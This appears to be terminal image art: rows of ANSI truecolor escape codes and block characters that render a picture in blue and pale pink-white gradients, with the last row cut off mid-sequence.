[38;2;215;224;251;48;2;98;124;222m▌[38;2;70;92;222;48;2;69;90;230m▍[38;2;67;88;230;48;2;65;83;225m▋[38;2;64;81;223;48;2;69;86;228m▋[38;2;69;87;228;48;2;71;92;231m▄[38;2;69;89;229;48;2;68;87;227m▚[38;2;73;93;233;48;2;66;83;223m▄[38;2;68;88;222;48;2;61;78;215m▄[38;2;81;114;224;48;2;117;164;247m▍[38;2;109;158;246;48;2;72;109;224m▌[38;2;58;80;218;48;2;64;88;224m▊[38;2;87;119;240;48;2;72;99;231m▃[38;2;85;125;240;48;2;75;110;232m▖[38;2;67;107;223;48;2;75;115;229m▋[38;2;82;126;235;48;2;83;132;239m▎[38;2;97;155;241;48;2;87;140;239m▝[38;2;105;164;243;48;2;116;177;244m▌[38;2;116;170;247;48;2;128;190;243m▂[38;2;97;147;240;48;2;121;183;244m▃[38;2;92;137;239;48;2;112;171;242m▃[38;2;82;123;233;48;2;110;167;244m▄[38;2;75;104;230;48;2;108;154;247m▄[38;2;74;105;230;48;2;65;94;225m▚[38;2;76;105;239;48;2;74;103;233m┲[38;2;78;110;235;48;2;75;114;232m▋[38;2;83;125;233;48;2;77;117;230m▗[38;2;89;137;241;48;2;81;126;233m▆[38;2;85;140;235;48;2;99;158;239m▋[38;2;112;176;243;48;2;106;166;239m▆[38;2;116;178;239;48;2;105;161;239m▃[38;2;97;146;242;48;2;85;125;239m▋[38;2;79;120;234;48;2;67;94;220m▖[38;2;60;82;219;48;2;55;63;202m▄[38;2;60;74;217;48;2;58;65;207m▅[38;2;65;81;223;48;2;63;76;219m▆[38;2;65;82;223;48;2;63;83;220m▋[38;2;68;91;224;48;2;78;105;233m▋[38;2;78;104;233;48;2;87;125;243m▂[38;2;82;114;235;48;2;90;137;242m▅[38;2;79;108;230;48;2;99;153;242m▄[38;2;76;103;229;48;2;111;166;240m▄[38;2;75;102;228;48;2;124;179;246m▄[38;2;75;104;229;48;2;117;168;240m▄[38;2;79;113;233;48;2;124;176;246m▄[38;2;85;121;236;48;2;130;180;246m▄[38;2;82;123;233;48;2;129;184;245m▄[38;2;90;136;237;48;2;136;192;248m▄[38;2;92;141;237;48;2;137;195;244m▄[38;2;88;133;238;48;2;126;177;248m▄[38;2;79;115;235;48;2;71;94;229m▌[38;2;60;77;215;48;2;67;74;185m▋[38;2;135;137;196;48;2;242;240;235m▎[0m
[38;2;214;224;249;48;2;96;122;219m▌[38;2;68;90;219;48;2;67;88;228m▍[38;2;66;87;230;48;2;68;85;231m▍[38;2;66;82;228;48;2;69;84;229m▂[38;2;67;86;227;48;2;67;85;227m╵[38;2;68;86;228;48;2;69;88;230m▋[38;2;74;96;231;48;2;70;90;229m▗[38;2;71;95;230;48;2;64;90;217m▍[38;2;81;114;224;48;2;113;157;244m▎[38;2;99;146;236;48;2;74;117;224m▍[38;2;85;124;235;48;2;70;100;223m▅[38;2;78;115;233;48;2;89;123;241m▅[38;2;67;102;227;48;2;83;118;236m▅[38;2;67;100;224;48;2;75;108;228m▅[38;2;68;102;222;48;2;78;116;232m▆[38;2;68;96;222;48;2;75;113;230m━[38;2;76;108;231;48;2;90;135;239m▆[38;2;77;105;231;48;2;94;140;241m▆[38;2;68;85;224;48;2;80;114;234m▅[38;2;63;76;220;48;2;76;105;233m▅[38;2;66;77;221;48;2;70;95;232m▅[38;2;63;77;223;48;2;64;85;226m▆[38;2;64;81;223;48;2;64;84;222m▋[38;2;68;91;225;48;2;72;100;229m▌[38;2;74;109;230;48;2;76;117;233m▋[38;2;80;123;234;48;2;85;129;237m▌[38;2;90;137;241;48;2;95;147;244m▍[38;2;98;155;243;48;2;95;154;242m▂[38;2;111;176;240;48;2;101;163;236m▝[38;2;113;179;237;48;2;120;185;240m▖[38;2;99;153;241;48;2;115;174;240m▝[38;2;99;148;239;48;2;85;130;238m▖[38;2;80;116;234;48;2;70;99;232m▅[38;2;76;102;236;48;2;64;84;226m▄[38;2;71;92;229;48;2;65;81;221m▃[38;2;66;81;222;48;2;67;85;223m▘[38;2;67;85;223;48;2;67;84;223m┚[38;2;65;76;218;48;2;70;86;223m▅[38;2;63;68;211;48;2;70;85;220m▆[38;2;59;64;205;48;2;63;76;212m▆[38;2;56;60;196;48;2;59;70;208m▅[38;2;54;56;198;48;2;58;68;208m▄[38;2;58;63;208;48;2;62;75;216m▅[38;2;60;71;215;48;2;67;85;226m▆[38;2;64;84;221;48;2;78;102;237m▅[38;2;67;97;223;48;2;76;109;231m▖[38;2;75;114;229;48;2;81;124;235m▖[38;2;92;132;243;48;2;86;128;238m▗[38;2;92;135;241;48;2;78;120;232m▃[38;2;79;124;236;48;2;73;109;228m▂[38;2;68;90;219;48;2;67;75;184m▋[38;2;129;127;190;48;2;239;233;233m▎[0m
[38;2;212;224;250;48;2;94;122;217m▌[38;2;67;91;219;48;2;67;89;228m▎[38;2;67;87;229;48;2;67;85;227m▋[38;2;68;86;227;48;2;67;83;227m▇[38;2;71;95;232;48;2;69;88;229m▗[38;2;70;88;229;48;2;69;94;229m▘[38;2;89;131;230;48;2;72;102;225m▗[38;2;115;162;244;48;2;81;116;231m▄[38;2;76;121;220;48;2;98;150;233m▋[38;2;112;170;242;48;2;95;147;233m▇[38;2;112;171;244;48;2;99;152;238m▖[38;2;101;156;241;48;2;85;134;234m▄[38;2;103;161;238;48;2;83;133;232m▄[38;2;115;178;241;48;2;93;146;233m▄[38;2;114;174;243;48;2;89;146;233m▆[38;2;114;167;249;48;2;98;149;241m━[38;2;86;128;240;48;2;77;112;235m▍[38;2;75;97;230;48;2;80;105;234m▂[38;2;79;96;234;48;2;70;90;225m▆[38;2;68;84;225;48;2;65;76;220m▘[38;2;64;73;218;48;2;67;77;221m▅[38;2;63;77;220;48;2;68;82;226m▂[38;2;64;80;223;48;2;70;91;230m▃[38;2;66;88;226;48;2;73;99;231m▃[38;2;69;98;229;48;2;76;112;232m▅[38;2;78;112;234;48;2;83;125;238m▃[38;2;83;128;240;48;2;92;142;242m▖[38;2;96;151;239;48;2;103;160;240m▋[38;2;124;181;239;48;2;107;166;237m▄[38;2;163;205;237;48;2;131;186;235m▗[38;2;172;214;241;48;2;133;190;237m▅[38;2;162;203;241;48;2;112;165;233m▄[38;2;130;179;238;48;2;94;137;235m▃[38;2;101;148;237;48;2;85;119;235m▃[38;2;92;126;235;48;2;78;106;230m▖[38;2;70;93;228;48;2;67;83;223m▌[38;2;65;76;218;48;2;65;80;221m▃[38;2;64;76;218;48;2;63;70;215m▘[38;2;62;66;211;48;2;59;63;206m▌[38;2;55;60;203;48;2;59;62;203m▅[38;2;58;64;204;48;2;58;61;201m▅[38;2;57;62;206;48;2;54;58;200m▅[38;2;65;73;218;48;2;59;64;210m▝[38;2;56;67;210;48;2;69;80;224m▃[38;2;61;81;218;48;2;75;95;231m▃[38;2;84;115;239;48;2;65;95;221m━[38;2;90;124;245;48;2;67;105;222m▄[38;2;66;104;220;48;2;77;116;231m━[38;2;76;119;229;48;2;89;137;239m▖[38;2;84;135;239;48;2;88;143;243m▝[38;2;80;120;232;48;2;77;94;198m▋[38;2;128;130;193;48;2;243;230;233m▎[0m
[38;2;210;226;251;48;2;100;131;227m▌[38;2;71;97;226;48;2;68;90;230m▍[38;2;69;89;231;48;2;67;87;228m▃[38;2;66;85;226;48;2;68;87;228m▘[38;2;72;96;234;48;2;70;93;232m▝[38;2;63;95;221;48;2;70;99;228m▝[38;2;84;125;224;48;2;117;167;233m▌[38;2;155;209;238;48;2;140;195;242m▅[38;2;95;151;224;48;2;146;198;242m▝[38;2;94;153;222;48;2;127;183;235m▘[38;2;128;189;242;48;2;112;173;237m▌[38;2;113;170;237;48;2;103;162;235m▁[38;2;98;152;241;48;2;111;169;242m▗[38;2;89;136;236;48;2;113;172;241m▅[38;2;86;130;236;48;2;102;154;242m▅[38;2;105;147;237;48;2;76;115;226m▂[38;2;78;110;224;48;2;60;87;216m▂[38;2;67;83;220;48;2;61;74;217m▂[38;2;63;73;218;48;2;62;71;217m▁[38;2;60;71;218;48;2;62;69;217m▄[38;2;71;92;227;48;2;60;72;216m▗[38;2;82;110;240;48;2;62;75;218m▂[38;2;62;80;219;48;2;59;72;216m▃[38;2;60;74;216;48;2;63;80;222m▘[38;2;66;88;227;48;2;68;94;228m▍[38;2;72;106;230;48;2;66;96;225m▝[38;2;74;112;230;48;2;83;129;230m▋[38;2;100;153;233;48;2;126;181;240m▋[38;2;169;209;232;48;2;142;195;233m▗[38;2;211;226;235;48;2;184;215;235m▗[38;2;222;230;234;48;2;203;221;236m▄[38;2;221;226;238;48;2;193;217;244m▅[38;2;203;222;238;48;2;163;207;241m▅[38;2;163;203;243;48;2;123;170;239m▅[38;2;110;153;237;48;2;91;128;236m▌[38;2;75;103;228;48;2;66;85;220m▎[38;2;63;81;220;48;2;64;74;218m▂[38;2;59;70;214;48;2;62;69;214m▂[38;2;60;65;209;48;2;61;67;212m▝[38;2;64;71;215;48;2;58;63;206m▄[38;2;60;66;211;48;2;54;59;200m▄[38;2;61;68;215;48;2;56;61;205m▄[38;2;62;69;214;48;2;61;70;218m▊[38;2;59;81;214;48;2;59;73;216m▗[38;2;117;168;236;48;2;77;108;219m▗[38;2;123;179;244;48;2;75;111;220m▅[38;2;93;145;237;48;2;71;112;226m▖[38;2;83;136;233;48;2;73;114;231m▂[38;2;78;126;229;48;2;89;141;237m▋[38;2;100;160;244;48;2;93;149;246m▅[38;2;91;121;216;48;2;101;149;235m▝[38;2;136;145;203;48;2;241;231;232m▎[0m
[38;2;210;227;251;48;2;105;138;229m▌[38;2;71;97;232;48;2;77;105;231m▝[38;2;75;104;234;48;2;70;94;229m▄[38;2;79;112;234;48;2;67;94;229m▃[38;2;88;132;230;48;2;70;102;231m▂[38;2;117;164;231;48;2;86;125;232m▂[38;2;115;159;231;48;2;157;202;236m▘[38;2;188;219;233;48;2;171;214;235m▄[38;2;189;217;236;48;2;174;213;240m▄[38;2;178;214;237;48;2;156;201;239m▆[38;2;160;207;237;48;2;138;193;236m▄[38;2;148;197;238;48;2;125;179;242m▃[38;2;136;186;237;48;2;101;153;234m▃[38;2;131;184;243;48;2;86;137;229m▃[38;2;77;128;219;48;2;115;172;231m▘[38;2;126;184;231;48;2;144;203;249m▃[38;2;101;144;236;48;2;123;177;241m▝[38;2;101;144;223;48;2;82;114;231m▁[38;2;84;120;221;48;2;66;85;221m▄[38;2;105;149;230;48;2;62;87;214m▂[38;2;116;172;241;48;2;73;110;225m▂[38;2;99;152;238;48;2;81;121;236m▃[38;2;88;135;234;48;2;63;93;218m▃[38;2;88;132;237;48;2;62;87;218m▃[38;2;90;136;238;48;2;68;96;225m▃[38;2;96;145;237;48;2;70;103;223m▃[38;2;131;180;233;48;2;89;137;224m▄[38;2;192;216;237;48;2;141;188;231m▄[38;2;218;229;234;48;2;184;215;233m▅[38;2;236;233;237;48;2;221;229;237m▅[38;2;245;235;240;48;2;235;233;232m▅[38;2;246;238;239;48;2;239;233;233m▄[38;2;222;230;237;48;2;240;233;238m▝[38;2;187;221;244;48;2;216;233;237m▝[38;2;123;171;238;48;2;169;208;240m▝[38;2;119;170;240;48;2;87;131;230m▄[38;2;93;137;235;48;2;70;102;226m▅[38;2;98;143;240;48;2;62;89;223m▅[38;2;99;145;240;48;2;63;88;219m▅[38;2;98;148;238;48;2;68;95;220m▄[38;2;101;152;234;48;2;64;90;212m▄[38;2;125;179;247;48;2;66;95;213m▄[38;2;125;180;245;48;2;65;95;211m▄[38;2;125;184;244;48;2;73;110;215m▄[38;2;112;163;241;48;2;126;189;243m▘[38;2;120;181;241;48;2;125;186;243m▂[38;2;117;175;235;48;2;98;155;234m▆[38;2;138;192;236;48;2;107;165;237m▄[38;2;146;198;238;48;2;107;166;233m▄[38;2;149;201;238;48;2;117;179;237m▃[38;2;140;192;231;48;2;120;173;232m▃[38;2;163;182;221;48;2;241;233;228m▎[0m
[38;2;212;233;248;48;2;121;159;230m▌[38;2;85;126;228;48;2;77;112;230m▖[38;2;100;146;227;48;2;81;120;230m▗[38;2;90;135;229;48;2;124;178;238m▘[38;2;143;197;239;48;2;114;167;235m▆[38;2;181;211;233;48;2;150;196;233m▃[38;2;180;218;236;48;2;203;220;233m▘[38;2;211;222;234;48;2;201;220;235m▄[38;2;211;223;234;48;2;199;220;235m▄[38;2;212;226;237;48;2;196;219;237m▄[38;2;210;225;238;48;2;191;216;238m▅[38;2;204;223;238;48;2;184;214;239m▅[38;2;189;218;237;48;2;164;207;236m▆[38;2;175;215;238;48;2;156;206;242m▆[38;2;165;206;233;48;2;151;202;240m▄[38;2;150;201;239;48;2;132;187;234m▆[38;2;142;196;235;48;2;135;189;238m▆[38;2;132;186;229;48;2;141;194;237m╼[38;2;121;174;226;48;2;142;196;241m╼[38;2;124;181;237;48;2;144;198;249m▆[38;2;116;183;239;48;2;132;194;251m▇[38;2;114;181;242;48;2;106;172;236m▋[38;2;114;180;232;48;2;103;163;234m▂[38;2;134;189;238;48;2;102;158;233m▃[38;2;165;206;235;48;2;114;166;229m▃[38;2;184;212;236;48;2;130;177;229m▅[38;2;212;226;237;48;2;178;213;241m▅[38;2;213;224;241;48;2;230;230;236m▘[38;2;240;234;237;48;2;235;233;233m▆[38;2;244;236;239;48;2;249;236;241m▌[38;2;252;241;242;48;2;251;239;242m▗[38;2;252;241;243;48;2;251;241;242m▁[38;2;251;241;242;48;2;248;239;241m▄[38;2;234;237;237;48;2;243;238;236m▝[38;2;203;224;241;48;2;225;232;238m▝[38;2;203;223;237;48;2;170;205;242m▄[38;2;162;204;235;48;2;126;175;236m▅[38;2;141;195;235;48;2;112;167;237m▄[38;2;137;190;240;48;2;110;166;239m▂[38;2;117;177;250;48;2;114;170;238m▝[38;2;117;178;242;48;2;99;160;234m▆[38;2;120;183;240;48;2;99;162;226m▅[38;2;127;188;235;48;2;106;167;231m▄[38;2;139;199;240;48;2;114;174;235m▃[38;2;148;200;238;48;2;116;175;238m▃[38;2;153;200;234;48;2;115;174;235m▃[38;2;165;204;232;48;2;134;189;233m▃[38;2;188;215;231;48;2;161;205;233m▅[38;2;212;222;237;48;2;186;212;240m▅[38;2;211;226;238;48;2;183;213;240m▅[38;2;195;221;236;48;2;169;211;237m▄[38;2;197;209;220;48;2;246;236;227m▍[0m
[38;2;228;239;250;48;2;165;199;234m▌[38;2;141;187;224;48;2;101;149;226m▃[38;2;102;147;223;48;2;161;206;236m▘[38;2;170;213;234;48;2;154;206;239m▄[38;2;162;204;232;48;2;185;216;237m▋[38;2;202;224;240;48;2;212;225;235m▍[38;2;223;226;237;48;2;218;224;235m▃[38;2;222;226;237;48;2;217;225;235m▄[38;2;223;227;237;48;2;218;226;236m▅[38;2;224;227;235;48;2;220;228;236m▅[38;2;231;231;235;48;2;220;227;234m▅[38;2;232;232;239;48;2;218;226;234m▃[38;2;221;231;240;48;2;204;221;234m▃[38;2;216;228;237;48;2;195;220;234m▃[38;2;215;227;239;48;2;191;217;235m▃[38;2;206;225;238;48;2;178;212;236m▄[38;2;198;223;237;48;2;169;209;234m▄[38;2;192;220;238;48;2;162;206;235m▄[38;2;174;214;238;48;2;153;202;237m▃[38;2;164;202;227;48;2;137;193;235m▂[38;2;159;202;228;48;2;126;185;232m▃[38;2;171;211;235;48;2;124;182;229m▃[38;2;189;219;237;48;2;141;194;230m▄[38;2;207;222;233;48;2;174;207;237m▅[38;2;222;224;236;48;2;199;220;237m▆[38;2;233;229;237;48;2;220;225;232m▅[38;2;231;228;234;48;2;240;231;239m▘[38;2;244;235;239;48;2;242;232;236m▅[38;2;245;236;238;48;2;247;238;240m▌[38;2;251;240;244;48;2;248;238;241m▗[38;2;254;242;244;48;2;250;240;242m▄[38;2;255;243;245;48;2;253;242;244m▃[38;2;254;242;244;48;2;252;240;242m▌[38;2;243;239;236;48;2;249;239;239m▝[38;2;241;237;236;48;2;237;235;237m▌[38;2;217;226;236;48;2;230;232;236m▝[38;2;219;227;237;48;2;201;219;236m▖[38;2;191;215;234;48;2;169;204;234m▆[38;2;190;217;236;48;2;162;203;240m▅[38;2;194;219;235;48;2;148;192;239m▄[38;2;180;209;236;48;2;125;177;236m▄[38;2;163;205;232;48;2;123;180;236m▃[38;2;128;190;235;48;2;140;199;233m▘[38;2;151;203;232;48;2;160;206;231m▋[38;2;186;218;235;48;2;171;212;234m▗[38;2;195;220;236;48;2;178;213;236m▆[38;2;212;226;235;48;2;192;216;234m▅[38;2;225;227;233;48;2;208;221;230m▅[38;2;233;231;236;48;2;224;227;235m▅[38;2;232;232;238;48;2;225;232;242m▆[38;2;221;233;238;48;2;216;225;231m▊[38;2;220;219;221;48;2;249;237;229m▍[0m
[38;2;250;241;246;48;2;242;240;243m▅[38;2;193;216;226;48;2;226;232;238m▝[38;2;206;225;234;48;2;194;224;233m▖[38;2;187;221;238;48;2;177;211;241m▘[38;2;174;204;227;48;2;203;223;234m▋[38;2;218;229;238;48;2;225;227;236m▍[38;2;225;229;236;48;2;224;227;238m▆[38;2;225;228;238;48;2;224;228;239m▇[38;2;230;230;240;48;2;227;230;240m▄[38;2;236;230;237;48;2;230;229;237m▗[38;2;235;231;237;48;2;238;231;238m▘[38;2;239;232;239;48;2;239;235;239m▘[38;2;241;237;241;48;2;232;234;240m▆[38;2;240;236;239;48;2;229;231;237m▅[38;2;238;235;235;48;2;229;229;237m▄[38;2;236;230;235;48;2;225;226;237m▃[38;2;237;230;235;48;2;221;225;235m▃[38;2;232;230;236;48;2;212;222;234m▄[38;2;228;229;238;48;2;200;219;233m▅[38;2;229;229;236;48;2;198;216;228m▅[38;2;235;231;234;48;2;209;221;231m▄[38;2;237;233;236;48;2;216;227;235m▄[38;2;235;235;238;48;2;221;231;237m▅[38;2;235;234;238;48;2;227;231;238m▅[38;2;235;233;238;48;2;231;231;237m▅[38;2;237;233;239;48;2;240;235;240m▋[38;2;246;236;242;48;2;242;236;239m▝[38;2;250;237;244;48;2;247;236;241m▗[48;2;250;238;242m┓[38;2;253;241;244;48;2;253;242;244m▋[38;2;254;242;244;48;2;254;242;245m▖[38;2;255;243;245;48;2;254;243;244m╴[38;2;254;243;244;48;2;252;242;244m▌[38;2;250;240;243;48;2;247;239;241m▉[38;2;246;240;241;48;2;243;238;238m▅[38;2;244;237;238;48;2;239;236;237m▌[38;2;218;225;235;48;2;230;232;238m▝[38;2;217;225;231;48;2;207;219;231m▅[38;2;207;220;231;48;2;215;224;232m▘[38;2;227;230;235;48;2;219;227;234m▗[38;2;231;231;238;48;2;218;223;238m▆[48;2;208;224;239m▆[38;2;229;233;238;48;2;196;224;235m▅[38;2;226;230;238;48;2;179;210;231m▆[38;2;229;231;239;48;2;197;213;228m▅[38;2;235;230;239;48;2;214;222;233m▄[38;2;237;231;240;48;2;226;230;240m▅[38;2;235;233;237;48;2;231;232;237m▆[38;2;235;232;236;48;2;235;233;237m▗[48;2;234;233;239m▎[38;2;227;233;237;48;2;222;228;233m▋[38;2;223;222;221;48;2;248;236;226m▍[0m
[38;2;252;240;247;48;2;251;241;246m┗[38;2;243;238;242;48;2;225;230;236m▋[38;2;209;226;237;48;2;191;219;236m▌[38;2;177;211;236;48;2;169;200;233m▍[38;2;180;203;232;48;2;213;224;240m▍[38;2;231;230;237;48;2;227;228;239m▃[38;2;229;229;238;48;2;226;229;238m▌[38;2;229;230;239;48;2;228;228;238m▅[38;2;231;230;239;48;2;232;230;239m▍[38;2;233;232;237;48;2;234;232;238m┛[38;2;234;233;238;48;2;237;233;239m▆[38;2;239;235;239;48;2;242;237;241m▌[48;2;245;237;242m [38;2;247;236;242m▗[48;2;244;235;240m▅[38;2;246;236;238;48;2;241;232;239m▅[38;2;247;237;238;48;2;243;233;238m▅[38;2;247;238;239;48;2;242;235;237m▄[38;2;248;238;240;48;2;241;237;237m▄[38;2;248;238;241;48;2;241;236;238m▅[38;2;246;239;242;48;2;245;236;239m▖[38;2;246;237;240;48;2;244;238;240m▊[38;2;243;239;240;48;2;242;238;239m▆[38;2;241;236;238;48;2;241;237;239m▗[38;2;238;232;235;48;2;239;233;238m╻[38;2;242;235;240;48;2;239;234;240m▂[38;2;241;237;238;48;2;245;238;240m▘[38;2;247;236;240;48;2;249;238;242m▘[38;2;251;239;243;48;2;252;240;244m▍[38;2;253;241;243;48;2;253;241;245m▃[38;2;254;242;244;48;2;255;243;245m▌[38;2;255;243;243;48;2;255;243;244m▝[38;2;254;242;244;48;2;254;242;242m▃[38;2;252;242;243;48;2;251;241;242m╵[38;2;248;239;240;48;2;249;239;241m┻[48;2;244;237;239m▎[38;2;240;236;240;48;2;236;233;237m▄[38;2;234;232;239;48;2;225;228;235m▃[38;2;232;229;236;48;2;222;226;234m▃[38;2;226;229;233;48;2;233;230;236m▘[38;2;234;229;234;48;2;240;234;239m▎[38;2;244;236;239;48;2;240;235;239m▃[38;2;246;236;240;48;2;240;234;239m▆[38;2;246;237;240;48;2;242;235;240m▄[38;2;245;238;239;48;2;240;235;240m▅[38;2;244;237;238;48;2;242;234;239m▅[38;2;242;234;241;48;2;242;235;239m┺[38;2;241;234;240;48;2;238;232;238m▋[38;2;238;233;239;48;2;237;232;238m▎[38;2;236;232;238;48;2;232;233;238m▎[38;2;228;230;235;48;2;226;230;235m▃[38;2;228;226;226;48;2;249;238;228m▍[0m
[38;2;253;243;246;48;2;252;242;244m▎[38;2;234;234;235;48;2;246;240;240m▝[38;2;200;222;235;48;2;220;230;235m▝[38;2;201;216;228;48;2;183;211;230m▄[38;2;207;220;232;48;2;229;230;239m▍[38;2;230;232;237;48;2;232;231;236m▃[38;2;230;230;237;48;2;230;231;240m▌[38;2;230;230;241;48;2;230;230;238m▌[38;2;230;231;236;48;2;232;232;238m▎[48;2;234;232;239m [38;2;235;232;239;48;2;235;233;239m▄[38;2;236;233;238;48;2;239;232;239m▋[38;2;242;234;240;48;2;245;236;241m▌[38;2;247;237;243;48;2;246;236;241m┗[38;2;247;236;242;48;2;248;237;242m▃[38;2;247;237;241;48;2;248;237;239m▅[38;2;247;238;241;48;2;248;237;240m▁[38;2;248;237;241;48;2;249;239;240m▆[38;2;247;236;240;48;2;249;238;241m▃[38;2;248;237;241;48;2;247;238;241m▊[38;2;247;238;241;48;2;246;239;241m▗[38;2;248;237;241;48;2;249;237;241m▎[38;2;244;236;239;48;2;247;237;240m┗[38;2;246;236;240;48;2;242;236;238m▂[38;2;246;237;240;48;2;241;235;237m▃[38;2;248;238;241;48;2;242;236;239m▄[38;2;249;239;243;48;2;247;239;241m▖[38;2;248;238;242;48;2;250;238;242m▍[38;2;251;239;243;48;2;253;241;244m▍[38;2;254;242;244;48;2;253;241;243m╴[38;2;252;240;242;48;2;254;242;244m▗[38;2;255;243;245m▝▘[38;2;252;240;242;48;2;250;239;240m▍[38;2;249;238;242;48;2;248;238;241m╹[38;2;246;239;241;48;2;246;238;242m╹[38;2;244;239;245;48;2;242;238;243m▅[38;2;240;238;243;48;2;238;235;240m▍[38;2;238;236;241;48;2;236;231;238m▅[38;2;236;233;238;48;2;235;230;237m▃[38;2;240;234;238;48;2;236;231;236m▝[38;2;238;234;239;48;2;243;237;239m▃[38;2;242;237;242;48;2;245;238;241m▂[38;2;244;238;239;48;2;245;240;240m▄[38;2;244;238;238;48;2;243;240;239m▅[38;2;245;237;238;48;2;244;239;238m▅[48;2;242;236;236m▌[38;2;242;236;238;48;2;240;234;236m▖[38;2;238;233;239;48;2;237;232;238m▖[38;2;236;232;238;48;2;232;233;237m▎[38;2;227;231;236;48;2;230;231;236m▆[38;2;233;230;229;48;2;249;237;229m▍[0m
[38;2;253;241;243;48;2;253;241;244m╹[38;2;252;240;241;48;2;247;239;240m▌[38;2;238;234;238;48;2;230;230;236m▍[38;2;230;231;237;48;2;222;227;236m▇[38;2;232;233;239;48;2;229;229;237m▅[38;2;231;231;239;48;2;230;231;238m╴[38;2;229;229;237;48;2;230;230;238m▃[48;2;228;228;236m▁[38;2;232;231;239;48;2;228;228;235m▝[38;2;233;231;240;48;2;232;231;237m▘[38;2;233;232;238;48;2;236;232;239m▄[38;2;234;231;238;48;2;236;231;239m▄[38;2;238;232;239;48;2;241;233;238m▍[38;2;242;234;238;48;2;245;235;241m▅[38;2;246;237;241;48;2;246;236;243m▆[38;2;247;238;241;48;2;246;237;241m╵[48;2;247;238;241m   [48;2;247;237;241m╴╴[38;2;248;237;241;48;2;248;237;240m╴[38;2;243;238;239;48;2;247;237;240m▗[38;2;238;236;239;48;2;244;237;240m▃[38;2;227;236;246;48;2;243;239;241m▂[38;2;225;235;243;48;2;245;239;241m▃[38;2;224;233;244;48;2;245;237;240m▃[38;2;217;230;244;48;2;244;236;240m▂[38;2;229;231;238;48;2;249;237;240m▃[38;2;235;233;237;48;2;249;238;240m▃[38;2;239;233;238;48;2;250;238;242m▃[38;2;239;233;236;48;2;250;238;243m▂[38;2;242;235;239;48;2;250;238;242m▃[38;2;242;235;240;48;2;249;237;242m▂[38;2;236;238;240;48;2;244;239;243m▂[38;2;220;236;242;48;2;240;238;244m▃[38;2;190;218;248;48;2;227;235;243m▃[38;2;166;206;243;48;2;221;232;241m▃[38;2;182;214;238;48;2;224;233;240m▃[38;2;204;219;229;48;2;229;231;237m▖[38;2;234;232;237;48;2;236;232;237m▊[38;2;238;233;238;48;2;240;235;240m▌[38;2;241;235;239;48;2;240;235;239m▂[38;2;240;236;240;48;2;242;238;241m▋[38;2;243;238;242;48;2;244;238;239m▅[38;2;242;238;239;48;2;244;237;236m▆[38;2;241;238;234;48;2;242;237;238m╸[38;2;239;235;236;48;2;237;232;236m▋[38;2;232;233;239;48;2;234;231;238m▗[38;2;233;233;238;48;2;229;233;237m▋[38;2;224;231;237;48;2;222;228;235m▊[38;2;229;227;227;48;2;247;238;228m▌[0m
[38;2;254;240;243;48;2;254;242;244m▅[38;2;253;240;242;48;2;248;239;241m▌[38;2;233;232;235;48;2;241;238;238m▝[38;2;229;228;233;48;2;232;231;236m▘[38;2;233;232;239;48;2;232;233;238m▅[38;2;232;231;239;48;2;231;231;238m╴[38;2;229;229;237;48;2;230;230;238m┣[38;2;230;230;238;48;2;228;228;236m▄[38;2;231;232;237;48;2;229;230;236m▄[38;2;232;233;237;48;2;232;232;235m▎[38;2;234;234;236;48;2;233;232;237m▅[38;2;235;233;237;48;2;233;231;238m▆[38;2;239;233;238;48;2;238;232;237m▇[38;2;241;233;238;48;2;244;235;239m▎[38;2;246;237;240;48;2;247;238;241m▍     [38;2;248;239;242m╴[38;2;248;239;240;48;2;247;236;240m▆[38;2;247;236;242;48;2;241;236;243m▋[38;2;227;232;241;48;2;206;224;241m▋[38;2;150;197;242;48;2;188;222;248m▅[38;2;105;164;236;48;2;167;206;246m▆[38;2;102;155;235;48;2;159;196;245m▆[38;2;111;168;230;48;2;172;208;246m▆[38;2;138;193;233;48;2;197;222;242m▄[38;2;167;210;243;48;2;210;227;241m▃[38;2;173;215;242;48;2;214;227;241m▃[38;2;173;213;239;48;2;216;228;239m▃[38;2;169;209;236;48;2;217;229;239m▃[38;2;171;208;238;48;2;220;231;241m▄[38;2;161;204;244;48;2;210;229;240m▄[38;2;127;179;241;48;2;186;219;247m▄[38;2;137;175;242;48;2;89;138;232m▘[38;2;90;141;227;48;2;106;159;225m▋[38;2;126;179;229;48;2;161;199;232m▌[38;2;194;213;231;48;2;225;230;236m▍[38;2;239;236;239;48;2;236;234;238m▄[38;2;241;235;239;48;2;241;236;240m╵[38;2;243;237;241;48;2;242;236;240m▗[38;2;244;238;242;48;2;242;237;241m┎[38;2;239;235;239m▗[38;2;236;234;237;48;2;241;237;239m▄[38;2;235;233;236m▅[38;2;233;231;238;48;2;237;232;238m▅[38;2;231;231;239;48;2;232;232;238m▅[38;2;231;232;238;48;2;228;232;238m▌[38;2;221;229;238;48;2;216;225;237m▋[38;2;223;223;226;48;2;246;238;227m▌[0m
[38;2;254;241;245;48;2;252;240;244m▍[38;2;254;238;244;48;2;252;241;243m▂[38;2;252;240;244;48;2;246;239;240m▂[38;2;244;238;241;48;2;236;232;236m▖[38;2;233;232;235;48;2;232;231;239m▃[38;2;232;232;236;48;2;231;230;240m▃[38;2;231;231;238;48;2;231;231;240m▄[38;2;232;231;237;48;2;232;230;239m▝[38;2;232;230;242;48;2;233;232;238m▂[38;2;233;233;239;48;2;233;232;237m▌[38;2;233;232;237;48;2;234;233;237m▋[38;2;234;233;238;48;2;236;234;239m▌[38;2;240;234;240;48;2;242;234;239m▌[38;2;244;233;238;48;2;245;234;240m▂[38;2;247;238;241;48;2;246;237;240m▝[48;2;247;238;241m [38;2;248;239;242m▖  [38;2;249;239;242m▗[38;2;250;239;243;48;2;248;238;241m▄[38;2;249;239;240;48;2;250;240;240m▘[38;2;248;237;238;48;2;241;236;239m▊[38;2;200;223;236;48;2;225;231;240m▝[38;2;135;198;237;48;2;175;212;237m▝[38;2;151;203;234;48;2;121;187;238m▃[38;2;141;197;234;48;2;120;185;239m▃[38;2;131;192;237;48;2;123;185;241m▂[38;2;123;183;242;48;2;124;185;241m╺[38;2;119;181;241;48;2;134;188;239m▆[38;2;112;177;238;48;2;143;197;246m▅[38;2;114;178;240;48;2;139;199;246m▅[38;2;110;175;236;48;2;133;194;244m▄[38;2;116;179;238;48;2;130;190;241m▅[38;2;118;179;240;48;2;122;182;238m━[38;2;125;184;234;48;2;112;170;237m▃[38;2;130;185;237;48;2;102;158;236m▄[38;2;149;194;230;48;2;115;171;229m▄[38;2;146;189;227;48;2;182;209;231m▘[38;2;215;222;234;48;2;233;230;235m▍[38;2;238;235;236;48;2;240;237;238m▏[38;2;241;237;238;48;2;243;238;240m▌[38;2;243;237;241;48;2;242;238;240m▝[38;2;241;237;239;48;2;242;236;240m▂[38;2;240;235;239;48;2;237;234;238m▊[38;2;236;235;239;48;2